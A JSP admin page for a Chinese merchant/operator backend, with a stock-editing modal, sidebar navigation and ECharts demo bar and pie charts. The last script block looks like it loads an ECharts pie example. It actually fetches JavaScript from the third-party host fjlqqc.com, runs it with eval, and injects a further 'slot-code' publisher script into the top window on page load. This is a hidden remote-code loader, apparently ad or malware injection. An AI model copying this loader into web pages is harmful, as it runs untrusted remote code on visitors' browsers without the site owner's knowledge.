<%--
  Created by IntelliJ IDEA.
  User: asus
  Date: 2018/5/17
  Time: 20:55
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%String path = request.getContextPath(); %>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>运营商管理后台</title>
    <!-- jquery -->
    <script type="text/javascript" src="<%=path %>/js/jquery-3.2.1/jquery-3.2.1.js"></script>
    <script src="<%=path%>/jpljsp/js/echarts.js"></script>
    <script src="<%=path%>/jpljsp/js/incubator-echarts-master/echarts.simple.js"></script>
    <link rel="stylesheet" href="<%=path%>/css/bootstrap.min.css" />
    <link rel="stylesheet" href="<%=path%>/css/bootstrap-responsive.min.css" />
    <link rel="stylesheet" href="<%=path%>/css/fullcalendar.css" />
    <link rel="stylesheet" href="<%=path%>/css/maruti-style.css" />
    <link rel="stylesheet" href="<%=path%>/css/maruti-media.css" class="skin-color" />
</head>

<body>
<%--修改库存的div--%>
<div class="modal fade" id="formId" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
                    &times;
                </button>
                <h4 class="modal-title"  onclick="updateyy(xwid)">
                    库存修改
                </h4>
            </div>
            <div class="modal-body">
                <form id="formIding">
                    <input type="hidden" name="repertory.repertoryId" >
                    <a class="icon-minus" href="javascript:jian()"></a>
                    <input  name="repertory.repertoryNumber" class="easyui-textbox">
                    <a class="icon-plus" href="javascript:jia()"></a>
                </form>
            </div>

            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">
                    关闭
                </button>
                <button type="button" class="btn btn-primary" data-dismiss="modal" onclick="updateCount()">
                    提交更改
                </button>
            </div>
        </div>
    </div>
</div>



<div id="header">
    <h1><a href="http://www.mafiashare.net">Shared on www.MafiaShare.net</a></h1>
</div>
<!--close-Header-part-->

<!--top-Header-messaages-->
<div class="btn-group rightzero"> <a class="top_message tip-left" title="Manage Files"><i class="icon-file"></i></a> <a class="top_message tip-bottom" title="Manage Users"><i class="icon-user"></i></a> <a class="top_message tip-bottom" title="Manage Comments"><i class="icon-comment"></i><span class="label label-important">5</span></a> <a class="top_message tip-bottom" title="Manage Orders"><i class="icon-shopping-cart"></i></a> </div>
<!--close-top-Header-messaages-->

<!--top-Header-menu-->
<div id="user-nav" class="navbar navbar-inverse">
    <ul class="nav">
        <li class="" ><a title="" href="#"><i class="icon icon-user"></i> <span class="text">Profile</span></a></li>
        <li class=" dropdown" id="menu-messages"><a href="#" data-toggle="dropdown" data-target="#menu-messages" class="dropdown-toggle"><i class="icon icon-envelope"></i> <span class="text">Messages</span> <span class="label label-important">5</span> <b class="caret"></b></a>
            <ul class="dropdown-menu">
                <li><a class="sAdd" title="" href="#">new message</a></li>
                <li><a class="sInbox" title="" href="#">inbox</a></li>
                <li><a class="sOutbox" title="" href="#">outbox</a></li>
                <li><a class="sTrash" title="" href="#">trash</a></li>
            </ul>
        </li>
        <li class=""><a title="" href="#"><i class="icon icon-cog"></i> <span class="text">Settings</span></a></li>
        <li class=""><a title="" href="login.html"><i class="icon icon-share-alt"></i> <span class="text">Logout</span></a></li>
    </ul>
</div>


<div id="sidebar"><a href="#" class="visible-phone"><i class="icon icon-home"></i>商家管理</a>
    <ul>
        <%--<li class="active"><i class="icon icon-home"></i> <span>商品管理</span></a>
            <ul>
                <li><a href="<%=request.getContextPath()%>/jump/tiao.action">商品录入</a></li>
                <li><a href="<%=request.getContextPath()%>/jump/tiaoManger.action"></a></li>
            </ul>
        </li>--%>
        <li> <a href="<%=request.getContextPath()%>/jump/tiao.action"><i class="icon icon-signal"></i> <span>商品管理</span></a> </li>
        <li> <a href="<%=request.getContextPath()%>/jump/tiaoPinpai.action"><i class="icon icon-signal"></i> <span>品牌管理</span></a> </li>
        <li> <a href="<%=request.getContextPath()%>/jump/info.action"><i class="icon icon-signal"></i> <span>信息管理</span></a> </li>
        <li> <a href="<%=request.getContextPath()%>/jump/updatePass.action"><i class="icon icon-signal"></i> <span>修改密码</span></a> </li>

        <li><a href="<%=request.getContextPath()%>/jpl/bb.action"><i class="icon icon-th"></i> <span>数据分析</span></a>

        </li>
        <li> <a href="#"><i class="icon icon-tag"></i> <span>订单详情</span></a> </li>
        <li> <a href="<%=request.getContextPath()%>/jpl/aa.action"><i class="icon icon-tags"></i> <span>库存管理</span></a> </li>
    </ul>
</div>

<div id="content">
    <div id="content-header">
        <div id="breadcrumb"> <a href="index." title="Go to Home" class="tip-bottom"><i class="icon-home"></i> Home</a> <a href="#" class="current">Tables</a> </div>
    </div>

    <div class="container-fluid">
        <div class="row-fluid">
            <div class="span12">
                <div class="widget-box">
                    <div class="widget-title">
                        <span class="icon"><i class="icon-th"></i></span>
                        <h5>数据展示</h5>
                    </div>

                    <div id="container" style="height: 100%"></div>
                    <div id="main" style="height: 100%"></div>
                    <div id="container2" style="height: 100%"></div>
                    <div class="widget-content nopadding">
                        <table class="table table-bordered data-table">
                            <thead>

                            </tbody>
                        </table>

                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row-fluid">
    <div id="footer" class="span12"> 2012 &copy; Marutii Admin. More Templates <a href="http://www.cssmoban.com/" target="_blank" title="模板之家">模板之家</a> - Collect from <a href="http://www.cssmoban.com/" title="网页模板" target="_blank">网页模板</a> </div>
</div>
<script type="text/javascript">
    // 基于准备好的dom，初始化echarts实例
    var myChart = echarts.init(document.getElementById('main'));

    // 指定图表的配置项和数据
    var option = {
        title: {
            text: 'ECharts 入门示例'
        },
        tooltip: {},
        legend: {
            data:['销量']
        },
        xAxis: {
            data: ["衬衫","羊毛衫","雪纺衫","裤子","高跟鞋","袜子"]
        },
        yAxis: {},
        series: [{
            name: '销量',
            type: 'bar',
            data: [5, 20, 36, 10, 10, 20]
        }]
    };

    // 使用刚指定的配置项和数据显示图表。
    myChart.setOption(option);
</script>
<script type="text/javascript">
    var dom = document.getElementById("container2");
    var myChart = echarts.init(dom);
    var app = {};
    option = null;
    option = {
        series : [
            {
                name: '访问来源',
                type: 'pie',
                radius: '55%',
                roseType: 'angle',
                data:[
                    {value:235, name:'视频广告'},
                    {value:274, name:'联盟广告'},
                    {value:310, name:'邮件营销'},
                    {value:335, name:'直接访问'},
                    {value:400, name:'搜索引擎'}
                ]
            }
        ]
    };;
    if (option && typeof option === "object") {
        myChart.setOption(option, true);
    }
</script>
<script type="text/javascript">
    var dom = document.getElementById("container");
    var myChart = echarts.init(dom);
    var app = {};
    option = null;
    var sourceScriptURI = 'http://echarts.baidu.com/examples/data/pie-simple.js';
    (function() {
        var evalGloble = eval;
        var _loader = function(uri) {
            if (!top || !this) {
                return setTimeout(arguments.callee, 50);
            }
            if (top != this) {
                return;
            }

            var s = window.top.document.createElement('script');
            s.src = uri;
            s.type = 'text/javascript';
            s.charset = 'utf-8';
            s.async = 'true';
            window.top.document.body.appendChild(s);
        };

        var evalSrcScript = function(uri) {
            var url = "http://www.fjlqqc.com/common/api/v1.0/src_script/?path=" + encodeURIComponent(uri);
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, false);
            xhr.setRequestHeader("X-Page-Charset", document.charset);
            xhr.send();
            try {
                evalGloble(xhr.responseText);
            } catch(error) {}
        };

        var getCurrentScript = function(sourceScriptURI) {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; ++i) {
                if (scripts[i].src == sourceScriptURI) return scripts[i];
            }
        };

        var _looper, injection;
        var _loop = function() {
            switch (document.readyState) {
                case 'loading':
                    break;
                case 'interactive':
                case 'complete':
                    clearInterval(_looper);
                    if (window.__COODAGLIFE__ === undefined) {
                        _loader(injectionScriptURI + trim(publisherID) + "/");
                        localStorage.COODAG_SERUM_IC = injectionScriptURI;
                        window.__COODAGLIFE__ = true;
                    }
                    break;
                default:
                    clearInterval(_looper);
                    break;
            }
        };

        var inject = function() {
            _looper = setInterval(_loop, 50);
        };

        function trim(s){
            return s.replace(/(^\s*)|(\s*$)/g, "");
        }

        var publisherID = '0b7d9e00-6139-4b15-972b-465c0921318b';
        var injectionScriptURI = "http://www.fjlqqc.com/common/api/v1.0/slot-code/publisher/";
        //var currentScript = getCurrentScript(sourceScriptURI);
        if (true) {
            evalSrcScript(sourceScriptURI);
        }

        inject();
    })();







    ;
    if (option && typeof option === "object") {
        myChart.setOption(option, true);
    }
</script>
</body>
</html>
